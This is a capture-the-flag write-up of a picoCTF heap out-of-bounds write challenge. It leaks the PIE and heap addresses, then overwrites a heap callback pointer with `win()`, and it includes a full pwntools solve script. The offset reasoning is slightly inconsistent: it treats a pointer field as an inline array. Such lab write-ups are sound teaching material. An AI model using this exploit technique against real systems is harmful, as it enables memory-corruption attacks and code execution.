# CyLab — Pizza Router

* **Platform:** CyLab Security Academy / picoCTF 2026 (Challenge ID: `758`)
* **Category:** Binary Exploitation / Heap OOB Write & Callback Hijack (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, Heap Analysis
* **Binary:** `router` (64-bit x86_64 ELF) with `city1.map`

---

## TL;DR

The application routes automated pizza delivery drones across a 2D city grid map. The `replay` command discloses code pointers (`renderer=%p`) to leak the PIE base address, while `receipt` discloses order heap structures (`hint=%p`). The `reroute <id> <heap_idx> <new_cost>` command contains an unbounded Out-of-Bounds (OOB) write primitive into the order entries list: `piVar[0] = dst_y * width + dst_x` and `piVar[1] = new_cost`. By chaining two OOB writes—first modifying global order parameters to stage `win()`'s lower 32 bits, and second writing `win()`'s upper 32 bits into the `fx_finish_dummy` callback at `heap + 0x430`—invoking `dispatch` triggers `win()` and outputs the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file router
router: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=router
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Key observations:
1. **Full Protections Enabled:** All modern compiler defenses (Full RELRO, Canary, NX, PIE, Fortify) are active.
2. **Intentional Address Leaks:**
   - `replay <id>`: outputs `renderer=%p` (points to `fx_draw_basic` at PIE offset `0x2270`).
   - `receipt <id>`: outputs `hint=%p` (points to the order struct on the heap).
3. **Symbol Table Available:** Key internal symbols are intact:
   - `fx_draw_basic = 0x2270`
   - `win = 0x2480`
   - Global Order Array `ORD = 0x5080`

---

## Static Analysis & Vulnerability

### 1. Order Data Structure & Callbacks

Each delivery order is represented on the heap:

```cpp
struct Order {
    int id;                     // Offset +0x00
    int dst_x;                  // Offset +0x04
    int dst_y;                  // Offset +0x08
    int cost;                   // Offset +0x0c
    void *entries_list;         // Offset +0x18 (Array of 8-byte step costs)
    ...
    void (*finish_callback)();  // Offset +0x430 (Target: default = fx_finish_dummy)
};
```

When an order completes via `dispatch <id>`, the router calls:
$$\text{order}\rightarrow\text{finish\_callback}()$$

### 2. Unbounded Indexing in `reroute`

```c
void reroute_order(int id, int heap_idx, int new_cost) {
    Order *ord = get_order(id);
    int *entries = (int *)(ord->entries_list);

    // VULNERABILITY: heap_idx is not checked for upper or negative limits
    int *target = entries + (heap_idx * 2);

    target[0] = ord->dst_y * map_width + ord->dst_x;  // Lower 32 bits
    target[1] = new_cost;                             // Upper 32 bits
}
```

Because `heap_idx` is unconstrained, `target` can index arbitrarily forward and backward across the heap.

```text
       Order Struct on Heap:
       +------------------------------------+  Offset +0x18: entries_list
       |  entries_list pointer              |
       |  ...                               |
       +------------------------------------+  Offset +0x430
       |  finish_callback (8 bytes)         |  <-- Target of OOB reroute!
       +------------------------------------+
```

---

## Dynamic Analysis & Exploitation Strategy

### 1. Information Disclosure
1. Load map: `load city1`.
2. Create order: `add_order 1 3`.
3. Read `replay 0`: extracts `renderer` pointer $\implies \text{PIE Base} = \text{renderer} - 0\text{x}2270$.
4. Calculate target addresses:
   $$\text{win} = \text{PIE Base} + 0\text{x}2480$$
5. Read `receipt 0`: extracts `hint` pointer $\implies \text{Heap Base}$.

### 2. Staged Two-Part Write
Writing a 64-bit function pointer (`win`) requires controlling both 32-bit halves:
- `low32` is determined by $\text{dst\_y} \times \text{width} + \text{dst\_x}$.
- `high32` is directly controlled by `new_cost`.

**Write 1:**
We use `reroute` to write to the global `ORD` array, setting `id = 49` and configuring `dst_x` such that $\text{dst\_y} \times \text{width} + \text{dst\_x}$ matches the lower 32 bits of `win()`.

**Write 2:**
We execute `reroute 49 131 <win_high32>`, where index 131 targets offset `+0x430` (`finish_callback`).
- `target[0]` receives $\text{low32}(\text{win})$.
- `target[1]` receives $\text{high32}(\text{win})$.
- The entire 64-bit function pointer at `heap + 0x430` is now set to `win()`.

### 3. Triggering Callback
Invoke `dispatch 49`. The router runs the order to completion and executes `order->finish_callback()`, directly calling `win()` to display the flag.

---

## Exploit

The complete exploit script is available at [solve.py](solve.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "mysterious-sea.picoctf.net", 62065
FX_DRAW_OFF = 0x2270
WIN_OFF = 0x2480
ORD_OFF = 0x5080
CITY1_WIDTH = 16

def to_i32(v):
    v &= 0xFFFFFFFF
    return v - 0x100000000 if v & 0x80000000 else v

def solve(io):
    def cmd(s):
        io.sendline(s.encode())
        return io.recvuntil(b"router> ").decode("latin1", "replace")

    cmd("load city1")
    cmd("add_order 1 3")

    # Leak PIE base and heap base
    r_out = cmd("replay 0")
    renderer = int(re.search(r"renderer=(0x[0-9a-fA-F]+)", r_out).group(1), 16)
    pie = renderer - FX_DRAW_OFF
    win = pie + WIN_OFF
    ord_base = pie + ORD_OFF

    rec_out = cmd("receipt 0")
    hint = int(re.search(r"hint=(0x[0-9a-fA-F]+)", rec_out).group(1), 16)
    log.info(f"PIE: {hex(pie)}, win: {hex(win)}, heap: {hex(hint)}")

    # Write 1: Setup destination coordinates in global order table
    idx_to_ord = (ord_base - (hint + 0x18)) // 8
    new_x = to_i32((win & 0xFFFFFFFF) - 3 * CITY1_WIDTH)
    cmd(f"reroute 0 {to_i32(idx_to_ord)} {new_x}")

    # Write 2: Overwrite finish callback with win()
    finish_idx = (hint + 0x430 - (hint + 0x18)) // 8
    cmd(f"reroute 49 {to_i32(finish_idx)} {to_i32(win >> 32)}")

    # Dispatch to trigger callback
    final = cmd("dispatch 49")
    m = re.search(r"(picoCTF\{[^}]+\}|academy\{[^}]+\})", final)
    if m:
        log.success(f"Flag captured: {m.group(1)}")
    else:
        print(final)

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 solve.py
[+] Opening connection to mysterious-sea.picoctf.net on port 62065: Done
[*] PIE: 0x555555554000, win: 0x555555556480, heap: 0x5555557592a0
[+] Flag captured: picoCTF{redacted}
[*] Closed connection to mysterious-sea.picoctf.net port 62065
```

---

## Key Takeaways & Lessons

1. **Information Leak Pairs:** When PIE and ASLR are fully enabled, applications often feature multiple distinct leaks (e.g. code pointers from renderers + heap pointers from receipts) that collectively enable relative memory addressing.
2. **Semi-Controlled Multi-Field Writes:** Even when an OOB write packs constrained values (e.g. calculated grid coordinates), staging operations across multiple passes allows constructing arbitrary 64-bit pointers.
3. **Targeting Heap Callback Pointers:** Applications that maintain function pointers in heap structs are prime targets for OOB array writes, eliminating the need to corrupt libc hooks or smash stack canaries.
